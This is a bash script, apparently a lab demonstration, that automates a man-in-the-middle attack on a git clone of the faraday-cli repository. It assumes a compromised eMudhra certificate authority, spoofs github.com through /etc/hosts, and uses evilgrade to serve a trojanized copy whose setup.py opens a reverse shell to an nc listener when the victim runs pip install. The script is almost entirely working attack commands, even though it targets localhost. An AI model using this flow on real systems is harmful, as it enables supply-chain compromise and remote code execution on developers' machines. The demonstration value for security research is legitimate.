#!/bin/bash
###############################################################################
# run_git.sh - git clone MITM of infobyte/faraday-cli via the compromised
#              eMudhra CA, end to end, driven by REAL evilgrade.
#
# Flow (what the victim does):
#   git clone https://github.com/infobyte/faraday-cli.git
#   pip install .
# The clone is MITMed (github.com DNS-spoofed to evilgrade, eMudhra-signed
# cert); the served repo is the real faraday-cli with a reverse shell injected
# into setup.py, which fires on `pip install .`.
#
# git has no --resolve, so the DNS redirect is done via /etc/hosts
# (github.com -> 127.0.0.1), added with sudo and reverted on exit. evilgrade
# binds :443 (sudo). The victim git must use the OpenSSL backend (system store)
# -- Apple's /usr/bin/git defaults to Secure Transport and rejects the cert, so
# we pass -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem (a
# Homebrew/Linux git would already behave this way).
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh

PORT=443
LPORT=4444
HOSTS_LINE="127.0.0.1 github.com www.github.com codeload.github.com"
REPO="$PWD/include/git_mitm/faraday-cli.git"

[ -d "$REPO" ] || { echo "Trojanized repo missing. Run: ./demo/emudhra_mitm/build_faraday_repo.sh"; exit 1; }

HOSTS_ADDED=0
cleanup() {
    sudo pkill -9 -f "demo/emudhra_mitm/serve.pl $PORT" 2>/dev/null
    [ -n "${NCPID:-}" ] && kill "$NCPID" 2>/dev/null
    [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }
    rm -rf /tmp/victim_faraday_clone
    wait 2>/dev/null
}
trap cleanup EXIT INT TERM

rm -f /tmp/OWNED_BY_GIT /tmp/git_cb.log; rm -rf /tmp/victim_faraday_clone
( nc -l "$LPORT" > /tmp/git_cb.log 2>&1 ) & NCPID=$!

echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
if ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed; aborting"; exit 1; }
    HOSTS_ADDED=1
else echo "   (already present)"; fi

echo "== starting REAL evilgrade webserver (git_clone_faraday, eMudhra cert) on :$PORT =="
start_evilgrade_root "$PORT" /tmp/eg_git.log "git_clone_faraday" || exit 1

echo
echo "== VICTIM step 1: git clone https://github.com/infobyte/faraday-cli.git =="
git -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem \
    clone "https://github.com/infobyte/faraday-cli.git" /tmp/victim_faraday_clone 2>&1 | sed 's/^/   /'
echo "   cloned: $(ls /tmp/victim_faraday_clone 2>/dev/null | tr '\n' ' ')"

echo
echo "== VICTIM step 2: pip install .  (the documented install step) =="
( cd /tmp/victim_faraday_clone && timeout 120 /usr/bin/python3 -m pip install \
    --no-build-isolation --no-cache-dir --disable-pip-version-check . 2>&1 | tail -4 | sed 's/^/   /' )
/usr/bin/python3 -m pip uninstall -y faraday-cli >/dev/null 2>&1
sleep 1

echo
echo "== PROOF: /tmp/OWNED_BY_GIT (dropped by the injected setup.py) =="
[ -f /tmp/OWNED_BY_GIT ] && sed 's/^/   /' /tmp/OWNED_BY_GIT || echo "   <not created>"
echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
[ -s /tmp/git_cb.log ] && sed 's/^/   /' /tmp/git_cb.log || echo "   <none>"

echo; echo "== done =="
